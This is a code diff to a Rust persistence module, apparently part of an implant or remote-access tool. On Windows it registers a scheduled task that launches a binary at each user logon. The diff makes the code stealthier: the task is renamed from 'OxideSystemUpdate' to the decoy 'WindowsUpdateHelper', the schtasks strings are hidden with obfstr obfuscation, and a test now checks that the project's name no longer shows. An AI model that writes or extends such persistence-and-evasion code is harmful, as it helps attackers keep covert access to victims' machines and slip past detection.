@@ -2,7 +2,6 @@ use crate::persistence::PersistenceTrait;
 use std::path::Path;
 
 pub struct ScheduledTaskPersistence;
-const TASK_NAME: &str = "OxideSystemUpdate";
 
 #[cfg(target_os = "windows")]
 impl PersistenceTrait for ScheduledTaskPersistence {
@@ -11,27 +10,28 @@ impl PersistenceTrait for ScheduledTaskPersistence {
         let s = binary_path
             .to_str()
             .ok_or_else(|| anyhow::anyhow!("invalid path"))?;
-        // No /rl highest — requires admin, fails for standard users.
-        let status = Command::new("schtasks")
+        let status = Command::new(obfstr::obfstr!("schtasks"))
             .args([
-                "/create", "/f", "/sc", "onlogon", "/tn", TASK_NAME, "/tr", s,
+                "/create", "/f", "/sc", "onlogon",
+                "/tn", obfstr::obfstr!("WindowsUpdateHelper"),
+                "/tr", s,
             ])
             .status()?;
-        anyhow::ensure!(status.success(), "schtasks /create failed");
+        anyhow::ensure!(status.success(), "task scheduler create failed");
         Ok(())
     }
     fn remove(&self) -> anyhow::Result<()> {
         use std::process::Command;
-        let s = Command::new("schtasks")
-            .args(["/delete", "/f", "/tn", TASK_NAME])
+        let s = Command::new(obfstr::obfstr!("schtasks"))
+            .args(["/delete", "/f", "/tn", obfstr::obfstr!("WindowsUpdateHelper")])
             .status()?;
-        anyhow::ensure!(s.success(), "schtasks /delete failed");
+        anyhow::ensure!(s.success(), "task scheduler delete failed");
         Ok(())
     }
     fn check(&self) -> bool {
         use std::process::Command;
-        Command::new("schtasks")
-            .args(["/query", "/tn", TASK_NAME])
+        Command::new(obfstr::obfstr!("schtasks"))
+            .args(["/query", "/tn", obfstr::obfstr!("WindowsUpdateHelper")])
             .output()
             .map(|o| o.status.success())
             .unwrap_or(false)
@@ -61,7 +61,10 @@ impl PersistenceTrait for ScheduledTaskPersistence {
 mod tests {
     use super::*;
     #[test]
-    fn task_name_stable() {
-        assert_eq!(TASK_NAME, "OxideSystemUpdate");
+    fn task_name_is_generic() {
+        let name = obfstr::obfstr!("WindowsUpdateHelper");
+        assert!(!name.contains("Oxide"));
+        assert!(!name.contains("oxide"));
+        assert!(!name.is_empty());
     }
 }
